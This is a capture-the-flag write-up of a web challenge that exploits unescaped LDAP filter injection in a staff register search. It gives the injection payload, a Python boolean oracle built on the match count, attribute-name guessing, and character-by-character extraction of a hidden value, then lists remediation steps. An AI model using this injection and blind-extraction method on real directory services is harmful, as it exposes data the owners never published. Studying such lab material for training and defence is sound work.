---
title: "SCC web challenge #3"
description: ""
date: 2026-10-17
tags: []
category: ctf
ctfName: "SCC 2026"
draft: false
---

# Sentinel Directorate, Staff Register — Writeup

**CTF Name:** SCC 2026

**Category:** Web (LDAP filter injection / blind extraction)
**Server:** `DomainOS-Register/3.1 Python/3.10.12`
**Flag:** `flag{f1lt3r_a4a6641aef}`

---

## 1. Briefing

The register is an enquiry service over a directory of staff. From `/register/notes` (procedure SR-3):

```
(|(cn=<enquiry>)(uid=<enquiry>))
```

is built by concatenating the enquiry **without escaping**. The assurance note ("enquiry text is under the register's control") is explicitly scoped to *rendering*; the 2011 audit note (never actioned) states the real problem:

- rendering uses a **published attribute set** (`cn`, `uid`, `title`, `department`, `roomnumber`, `telephonenumber`);
- matching is performed against **every attribute an entry holds**, rendered or not;
- the reported `matched` count is the count of everything that matched.

Endpoints:

| Method | Path | Purpose |
|---|---|---|
| GET | `/register/search?q=NAME` | enquiry, returns `{filter_used, matched, names}` |
| GET | `/register/entry/CN` | render one person from the published set |
| GET | `/register/notes` | SR-3 procedure |
| POST | `/register/confirm` | body `{"clearance": "..."}` |

Goal: recover the clearance held on the sealed (non-person) holding record and confirm it.

---

## 2. Attack surface

`q=*` returns:

```json
{ "filter_used": "(|(cn=*)(uid=*))", "matched": 5,
  "names": ["A. Halloran", "J. A. Hume", "M. Cardew", "R. Meikle"] }
```

**5 entries matched, only 4 listed** → matches the briefing: the sealed holding is a 5th record that is not a person and is never listed. The count is the leak channel.

Supporting probes:

```
(|(cn=x)(objectClass=person)(cn=x)(uid=x)...)   -> matched 4, names 4   # people
(|(cn=x)(!(objectClass=person))(cn=x)...)       -> matched 1, names []  # the holding
(|(cn=x)(userPassword=*)(cn=x)...)              -> matched 4            # people have userPassword
(|(cn=x)(roomnumber=*)(cn=x)...)                -> matched 4
```

The `/register/entry/` endpoint does an **exact** CN lookup and requires a person — no injection there (`*`, `x)(cn=*`, the holding's CN all return `404 no such person`). All leverage is in `/register/search`.

---

## 3. Building the oracle

Because the filter is `(|(cn=E)(uid=E))`, an enquiry containing `)(`/`(` closes the `cn` clause and opens new ones. Injecting

```
E = x)( <clause> )(cn=x
```

produces

```
(|(cn=x)(<clause>)(cn=x)(uid=x)(<clause>)(cn=x))
```

All `cn=x` / `uid=x` clauses match nothing (distinct from every entry). The duplicate `<clause>` is harmless under OR. So

```
matched == |{ entries satisfying <clause> }|
```

Restricting to the sealed record (`(&(!(objectClass=person)) <cond>)`) yields a **boolean oracle over the holding's attributes**:

```python
def isolate(clause):
    # clause is a full parenthesized filter, e.g. '(&(a=b)(c=d))'
    r = search("x)(" + clause + ")(cn=x")
    return r["matched"] == 1
```

Sanity checks:

| clause | matched | meaning |
|---|---|---|
| `(objectClass=*)` | 1 | one non-person entry |
| `(cn=*)` | 1 | holding has `cn` |
| `(roomnumber=*)` | 0 | holding has no `roomnumber` |
| `(clearance=*)` | 0 | attribute is *not* named `clearance` |

Errors from the hand-rolled parser (`trailing text after the filter`, `item is not an assertion`) are informational only and leak no directory data.

---

## 4. Reading the holding record

Blind-extract ASCII strings with `(&(!(objectClass=person))(ATTR=<prefix>*))`, branching when the next char is ambiguous and terminating on exact equality. Note that LDAP equality is **case-insensitive**, so extraction is case-folded (see §6).

```
cn           = RECORDS-ASSURANCE-HOLDING
uid          = HOLDING
title        = SEALED HOLDING, DOCKET 4471-C
department   = RECORDS ASSURANCE
objectClass  = DIRECTORATEHOLDING
```

None of these is the clearance (`/register/confirm` rejects each, including `flag{...}` wrappers), and the hidden attribute name is not in the rendered set.

---

## 5. Finding the hidden attribute name

Attribute names cannot be wildcarded in LDAP, so the name must be guessed. Presence on the holding is a cheap oracle:

```python
isolate("(%s=*)" % name)   # 1 => the holding holds this attribute
```

- The full Windows AD attribute list (1 720 names) → no hit beyond `cn/uid/title/department/objectClass`.
- Thematic compounds (roots × suffixes × separators, 7 235 names) →

```
HIT: directorateClearance   (a.k.a. directorateclearance; lookup is case-insensitive)
```

Cross-check: `(directorateclearance=*)` matches the holding and is invisible to `/register/entry/` — an attribute held but never rendered, exactly as SR-3 warns.

---

## 6. Extracting the value

Char-by-char substring oracle on the holding:

```python
isolate("(directorateclearance=%s%s*)" % (esc(prefix), esc(c)))
```

`esc()` percent-escapes `\`, `*`, `(` and `)` as `\XX` so data is never mistaken for filter syntax. Result after case-folding:

```
FLAG{F1LT3R_A4A6641AEF}
```

LDAP equality is case-insensitive, so the oracle cannot distinguish `F` from `f`. Since the value is submitted as a flag, the candidate set is small; `/register/confirm` gives the final exact-match check:

| submitted | result |
|---|---|
| `FLAG{F1LT3R_A4A6641AEF}` | 403 |
| `flag{F1LT3R_A4A6641AEF}` | 403 |
| `flag{F1Lt3R_A4A6641Aef}` | 403 |
| **`flag{f1lt3r_a4a6641aef}`** | **200** |

```json
POST /register/confirm  {"clearance": "flag{f1lt3r_a4a6641aef}"}

{ "docket": "4471-C", "released": true, "clearance": "flag{f1lt3r_a4a6641aef}" }
```

---

## 7. Flag

```
flag{f1lt3r_a4a6641aef}
```

---

## 8. Root cause & remediation

- **Root cause:** unescaped enquiry concatenated into an LDAP filter, combined with an oracle that counts matches across *all* attributes rather than the rendered set. The rendered set gives no false sense of safety; the count leaks the held attributes.
- **Fix 1:** escape RFC 4515 metacharacters (`\`, `*`, `(`, `)`, NUL) in user input before interpolation — or build the filter with a proper library.
- **Fix 2:** do not return a raw match count for queries that can reach non-rendered attributes; restrict matching (or the count) to the published attribute set.
- **Fix 3:** the 2011 audit note had already identified this and was "never actioned" — patch on finding, not on review cycle.

## 9. Notes on scope

Probing left no state change on the target (GET-only, plus the single successful confirm). Helper code used during the run lives in `/tmp/csa/` and is not part of this writeup directory.